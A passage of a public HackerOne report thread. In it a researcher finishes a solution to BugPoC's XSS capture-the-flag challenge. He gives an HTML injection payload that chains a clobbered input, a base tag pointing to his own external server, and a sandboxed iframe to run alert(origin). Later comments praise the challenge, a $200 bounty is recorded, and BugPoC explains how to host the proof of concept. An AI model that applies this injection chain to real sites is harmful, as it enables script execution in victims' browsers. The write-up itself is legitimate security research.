class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eiframe\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003econtentDocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eIn this code, I am creating a \u003ccode\u003escript\u003c/code\u003e element, and using the \u003ccode\u003eallow-same-origin\u003c/code\u003e sandbox attribute to append my \u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e which has \u003ccode\u003eallow-modals\u003c/code\u003e allowed in the sandbox attribute. \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eContents of \u003ccode\u003eao.js\u003c/code\u003e: \u003ccode\u003ealert(origin);\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eSo my finalized payload is: \u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003efileIntegrity\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003ecGkWfmcd5KHg/6pcwwGbw0pqZl6Mxr+TyM1O6btW1ds=\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;base\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://xss-server.herokuapp.com/\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etarget=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;_blank\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003esandbox=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;allow-scripts allow-modals allow-same-origin\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;analyticsframe\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;invisible\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eHope, I did my best to make this understand and which things are being used over here and the reason behind using them. For any clarification or doubt, feel free to ping me.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"proof-of-concept\"\u003eProof Of Concept:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eScreenshot\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"zzz.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qk6DMsJUiJzpXVMUj65Aep6a?response-content-disposition=attachment%3B%20filename%3D%22zzz.png%22%3B%20filename%2A%3DUTF-8%27%27zzz.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVN4C5GIR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T041234Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICjdrX7ABZ%2BvfX76vY4hAT36HAFa7ABTRFnFNWlME3RsAiA6spUqHGGbpGIJMpDYYPRLrN21uLj3JvPgDLV04KLXWCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIM%2BwbYtZgzO0HRNuilKpED0QRzghA3dQ82LDNvNHg%2F%2Bapjkbzzquj0OQyaslf6lhZ6ae5aaEALaU1htc90%2FTkEnCjK7YAB%2BOOqYauHnXFwgnicH8P2qB1b6qq8ByPdiyv%2F6FeKLaeKEKd1ked0wxhxGILfvv9geWvP9kPkCkrnpW%2Bk3I2nWFhXQ59oSwcUQzXUMoZ0agtptlqAo0vIB0BQ8w3QdM1eyZALy%2Fa2aEoAk0NEEkFhGgVq6y7NSlne0HYNYsnTubU1gtBiWgKFN75WWxAKzP41DZr9biaTv2LpKz%2BS54%2B0D7gM01Pv9DWNFSxduldCjFNWMHaz53TpINKZivByzZ%2FZritkdAHNoYR8NUHdDo4fG9KADtaMgItKYoCYS9dQ3VQKUnEB%2FG5XIqiEWJNuiVPw9Xo1zZJ7ItciKJ%2F2lZOYbSY5IWLtOLK3LAXfBln%2BqWM6KN%2BYSgAqj80OMMoKJozuCJRCLPgT%2BsuXVxgkfPMjWm0msUwRdOuNqAG3PPIFx7Qi20ur1fS33s63LIR24RY3pe1aeEm14DkixQAwqvyp%2FwU67AFUTZKxgkosuC9%2FFnLTDWAcFKkGbWeTSyQlX9WvARJtmEGSKKE3O3RCz4o1fvK2y8cIWG4ZDqIQnnY30DkA5lvQ1S96196eUcIlxUE3IU6WzlYzirsAJvCXzxdcKxl0gn59sA3vLFJkUTgoas7IMyJTtRG6%2B0%2BVBuYKCHqJR1eTwSQxZvSP%2Bzn9VyHRQJZnA1hWcpkteF706gKj%2FXnieX9VW%2FOBOoEUExU1kfEmA0ZpoQRXSm8ma7vzsQoYhwoevAvKutaOvkhM8WM71tgT1%2FjC27FmA%2F%2FsDsAjQs2Rv9IujFElYACO0n6OSheOZw%3D%3D\u0026amp;X-Amz-Signature=2dd105859da892d683de12064c83f502352e1c41b037fb3ae50939a500370571\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qk6DMsJUiJzpXVMUj65Aep6a?response-content-disposition=attachment%3B%20filename%3D%22zzz.png%22%3B%20filename%2A%3DUTF-8%27%27zzz.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVN4C5GIR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T041234Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICjdrX7ABZ%2BvfX76vY4hAT36HAFa7ABTRFnFNWlME3RsAiA6spUqHGGbpGIJMpDYYPRLrN21uLj3JvPgDLV04KLXWCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIM%2BwbYtZgzO0HRNuilKpED0QRzghA3dQ82LDNvNHg%2F%2Bapjkbzzquj0OQyaslf6lhZ6ae5aaEALaU1htc90%2FTkEnCjK7YAB%2BOOqYauHnXFwgnicH8P2qB1b6qq8ByPdiyv%2F6FeKLaeKEKd1ked0wxhxGILfvv9geWvP9kPkCkrnpW%2Bk3I2nWFhXQ59oSwcUQzXUMoZ0agtptlqAo0vIB0BQ8w3QdM1eyZALy%2Fa2aEoAk0NEEkFhGgVq6y7NSlne0HYNYsnTubU1gtBiWgKFN75WWxAKzP41DZr9biaTv2LpKz%2BS54%2B0D7gM01Pv9DWNFSxduldCjFNWMHaz53TpINKZivByzZ%2FZritkdAHNoYR8NUHdDo4fG9KADtaMgItKYoCYS9dQ3VQKUnEB%2FG5XIqiEWJNuiVPw9Xo1zZJ7ItciKJ%2F2lZOYbSY5IWLtOLK3LAXfBln%2BqWM6KN%2BYSgAqj80OMMoKJozuCJRCLPgT%2BsuXVxgkfPMjWm0msUwRdOuNqAG3PPIFx7Qi20ur1fS33s63LIR24RY3pe1aeEm14DkixQAwqvyp%2FwU67AFUTZKxgkosuC9%2FFnLTDWAcFKkGbWeTSyQlX9WvARJtmEGSKKE3O3RCz4o1fvK2y8cIWG4ZDqIQnnY30DkA5lvQ1S96196eUcIlxUE3IU6WzlYzirsAJvCXzxdcKxl0gn59sA3vLFJkUTgoas7IMyJTtRG6%2B0%2BVBuYKCHqJR1eTwSQxZvSP%2Bzn9VyHRQJZnA1hWcpkteF706gKj%2FXnieX9VW%2FOBOoEUExU1kfEmA0ZpoQRXSm8ma7vzsQoYhwoevAvKutaOvkhM8WM71tgT1%2FjC27FmA%2F%2FsDsAjQs2Rv9IujFElYACO0n6OSheOZw%3D%3D\u0026amp;X-Amz-Signature=2dd105859da892d683de12064c83f502352e1c41b037fb3ae50939a500370571\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T09:30:00.803Z","updated_at":"2020-11-05T09:30:00.803Z","actor":{"username":"virenpawar","cleared":false,"url":"/virenpawar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/A6uCWvc4eMMyq8HqjRo4AbMr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1065946,"filename":"zzz.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qk6DMsJUiJzpXVMUj65Aep6a?response-content-disposition=attachment%3B%20filename%3D%22zzz.png%22%3B%20filename%2A%3DUTF-8%27%27zzz.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVN4C5GIR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041234Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICjdrX7ABZ%2BvfX76vY4hAT36HAFa7ABTRFnFNWlME3RsAiA6spUqHGGbpGIJMpDYYPRLrN21uLj3JvPgDLV04KLXWCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIM%2BwbYtZgzO0HRNuilKpED0QRzghA3dQ82LDNvNHg%2F%2Bapjkbzzquj0OQyaslf6lhZ6ae5aaEALaU1htc90%2FTkEnCjK7YAB%2BOOqYauHnXFwgnicH8P2qB1b6qq8ByPdiyv%2F6FeKLaeKEKd1ked0wxhxGILfvv9geWvP9kPkCkrnpW%2Bk3I2nWFhXQ59oSwcUQzXUMoZ0agtptlqAo0vIB0BQ8w3QdM1eyZALy%2Fa2aEoAk0NEEkFhGgVq6y7NSlne0HYNYsnTubU1gtBiWgKFN75WWxAKzP41DZr9biaTv2LpKz%2BS54%2B0D7gM01Pv9DWNFSxduldCjFNWMHaz53TpINKZivByzZ%2FZritkdAHNoYR8NUHdDo4fG9KADtaMgItKYoCYS9dQ3VQKUnEB%2FG5XIqiEWJNuiVPw9Xo1zZJ7ItciKJ%2F2lZOYbSY5IWLtOLK3LAXfBln%2BqWM6KN%2BYSgAqj80OMMoKJozuCJRCLPgT%2BsuXVxgkfPMjWm0msUwRdOuNqAG3PPIFx7Qi20ur1fS33s63LIR24RY3pe1aeEm14DkixQAwqvyp%2FwU67AFUTZKxgkosuC9%2FFnLTDWAcFKkGbWeTSyQlX9WvARJtmEGSKKE3O3RCz4o1fvK2y8cIWG4ZDqIQnnY30DkA5lvQ1S96196eUcIlxUE3IU6WzlYzirsAJvCXzxdcKxl0gn59sA3vLFJkUTgoas7IMyJTtRG6%2B0%2BVBuYKCHqJR1eTwSQxZvSP%2Bzn9VyHRQJZnA1hWcpkteF706gKj%2FXnieX9VW%2FOBOoEUExU1kfEmA0ZpoQRXSm8ma7vzsQoYhwoevAvKutaOvkhM8WM71tgT1%2FjC27FmA%2F%2FsDsAjQs2Rv9IujFElYACO0n6OSheOZw%3D%3D\u0026X-Amz-Signature=2dd105859da892d683de12064c83f502352e1c41b037fb3ae50939a500370571"}],"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9731156,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"- Hey team, if possible can you remove the word **[Partial]** from the report title heading? \n\nRegards,\n\\-virenpawar","markdown_message":"\u003cul\u003e\n\u003cli\u003eHey team, if possible can you remove the word \u003cstrong\u003e[Partial]\u003c/strong\u003e from the report title heading? \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n-virenpawar\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T09:31:52.705Z","updated_at":"2020-11-05T09:31:52.705Z","actor":{"username":"virenpawar","cleared":false,"url":"/virenpawar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/A6uCWvc4eMMyq8HqjRo4AbMr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9731614,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey team, this entire CTF is still in my mind and I want to express my thoughts.\n\nI don't know that how many persons have solved this but to me, this is the BEST CTF I have ever solved in my life, I am a person who is very much into XSS, and solving this challenge was absolutely AMAZING!! I mean just thinking about this challenge, the first things which come into my mind that how much time the CTF-maker would have invested to make such a challenge, really impressive man. I mean that this challenge covers all the major and minor vulnerabilities chaining like DOM Clobbering, CSP analysis, JS nature/behavior for `window.name` noticing, having knowledge of complete HTML app with respect to understanding `\u003cbase\u003e` tag and other tags and especially `\u003ciframe\u003e`'s sandbox behavior, also manipulating parent domain's first iframe from another instance of child iframe and all this wouldn't be possible without hosting files on own server and mixing all this stuff to create the solution for the challenge is really MESMERIZING. In terms to rate this out of 10, I would say this WORLD-CLASS-LEVEL-CTF with a rating of 100 ⭐, yes it is 100, not any typo. Would love to see more challenges like this in the future :D\n\nRegards,\n\\-virenpawar","markdown_message":"\u003cp\u003eHey team, this entire CTF is still in my mind and I want to express my thoughts.\u003c/p\u003e\n\n\u003cp\u003eI don\u0026#39;t know that how many persons have solved this but to me, this is the BEST CTF I have ever solved in my life, I am a person who is very much into XSS, and solving this challenge was absolutely AMAZING!! I mean just thinking about this challenge, the first things which come into my mind that how much time the CTF-maker would have invested to make such a challenge, really impressive man. I mean that this challenge covers all the major and minor vulnerabilities chaining like DOM Clobbering, CSP analysis, JS nature/behavior for \u003ccode\u003ewindow.name\u003c/code\u003e noticing, having knowledge of complete HTML app with respect to understanding \u003ccode\u003e\u0026lt;base\u0026gt;\u003c/code\u003e tag and other tags and especially \u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e\u0026#39;s sandbox behavior, also manipulating parent domain\u0026#39;s first iframe from another instance of child iframe and all this wouldn\u0026#39;t be possible without hosting files on own server and mixing all this stuff to create the solution for the challenge is really MESMERIZING. In terms to rate this out of 10, I would say this WORLD-CLASS-LEVEL-CTF with a rating of 100 ⭐, yes it is 100, not any typo. Would love to see more challenges like this in the future :D\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n-virenpawar\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T10:27:14.372Z","updated_at":"2020-11-05T10:27:14.372Z","actor":{"username":"virenpawar","cleared":false,"url":"/virenpawar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/A6uCWvc4eMMyq8HqjRo4AbMr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9734482,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey virenpawar!\n\nGreat job solving this CTF! We appreciate the time and effort you put into this. We are giving you a small bounty as a token of our appreciation!\n\nSorry you had some trouble using BugPoC. Here are the steps for how to use BugPoC to host 100% of the infrastructure needed to solve this challenge:\n\n**Make the \"Helpers\":**\n\n1. Host the `/frame-analytics.js` file using the [Mock Endpoint](https://bugpoc.com/testers/other/mock). This feature lets you create a maintenance-free server response. Great for quick JavaScript files :)\n1. Create a [Flexible Redirector](https://bugpoc.com/testers/other/redir) that points to your Mock Endpoint from Step #1. This will let you access the file from **many** URL patterns (such as `/foo/bar/baz.js` etc)\n\n**Make the PoC**\n\n1. Visit the [Front-End PoC Generator](https://bugpoc.com/testers/front-end) and enter your HTML code\n1. Enter a title and descriptions\n1. Click Publish!\n\nYou will then have a password-protected PoC that doesn't require you to maintain any servers, SSL certs, etc. You can then share the PoC ID \u0026 Password in bug bounty portals, emails, or pentest deliverables.\n\nThanks again for checking out the challenge and providing feedback. We are really glad you enjoyed it!\n\nCheers,\nRyan\n","markdown_message":"\u003cp\u003eHey virenpawar!\u003c/p\u003e\n\n\u003cp\u003eGreat job solving this CTF! We appreciate the time and effort you put into this. We are giving you a small bounty as a token of our appreciation!\u003c/p\u003e\n\n\u003cp\u003eSorry you had some trouble using BugPoC. Here are the steps for how to use BugPoC to host 100% of the infrastructure needed to solve this challenge:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eMake the \u0026quot;Helpers\u0026quot;:\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eHost the \u003ccode\u003e/frame-analytics.js\u003c/code\u003e file using the \u003ca href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Ftesters%2Fother%2Fmock\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eMock Endpoint\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. This feature lets you create a maintenance-free server response. Great for quick JavaScript files :)\u003c/li\u003e\n\u003cli\u003eCreate a \u003ca href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Ftesters%2Fother%2Fredir\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFlexible Redirector\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that points to your Mock Endpoint from Step #1. This will let you access the file from \u003cstrong\u003emany\u003c/strong\u003e URL patterns (such as \u003ccode\u003e/foo/bar/baz.js\u003c/code\u003e etc)\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003eMake the PoC\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eVisit the \u003ca href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Ftesters%2Ffront-end\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFront-End PoC Generator\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and enter your HTML code\u003c/li\u003e\n\u003cli\u003eEnter a title and descriptions\u003c/li\u003e\n\u003cli\u003eClick Publish!\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eYou will then have a password-protected PoC that doesn\u0026#39;t require you to maintain any servers, SSL certs, etc. You can then share the PoC ID \u0026amp; Password in bug bounty portals, emails, or pentest deliverables.\u003c/p\u003e\n\n\u003cp\u003eThanks again for checking out the challenge and providing feedback. We are really glad you enjoyed it!\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nRyan\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T15:15:35.272Z","updated_at":"2020-11-05T15:15:35.272Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"virenpawar","url":"/virenpawar"},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9734483,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-05T15:15:43.495Z","updated_at":"2020-11-05T15:15:43.495Z","actor":{"url":"/bugpoc","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"BugPoC"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"bugpoc","collaborator":{"username":"virenpawar","url":"/virenpawar"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9734484,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-05T15:16:01.367Z","updated_at":"2020-11-05T15:16:01.367Z","additional_data":{"old_title":"[Partial] Solution to the challenge | Will update it as I get the final alert(...) ","new_title":"Solution to the XSS Challenge "},"actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9737856,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @bugpoc_ryan,\n\nThanks for the bounty and guide for using BugPoc with steps for this case. Going to try now that how can I do the same, as doing so using BugPoc will greatly help in the future to go with. \n\nThanks and Regards,\nViren","markdown_message":"\u003cp\u003eHey \u003ca href=\"/bugpoc_ryan\"\u003e@bugpoc_ryan\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for the bounty and guide for using BugPoc with steps for this case. Going to try now that how can I do the same, as doing so using BugPoc will greatly help in the future to go with. \u003c/p\u003e\n\n\u003cp\u003eThanks and Regards,\u003cbr\u003e\nViren\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T18:46:39.900Z","updated_at":"2020-11-05T18:46:39.900Z","actor":{"username":"virenpawar","cleared":false,"url":"/virenpawar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/A6uCWvc4eMMyq8HqjRo4AbMr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9910193,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-24T10:05:16.367Z","updated_at":"2020-11-24T10:05:16.367Z","first_to_agree":true,"actor":{"username":"virenpawar","cleared":false,"url":"/virenpawar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/A6uCWvc4eMMyq8HqjRo4AbMr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9915743,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-24T18:17:59.558Z","updated_at":"2020-11-24T18:17:59.558Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9915744,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-24T18:17:59.764Z","updated_at":"2020-11-24T18:17:59.764Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}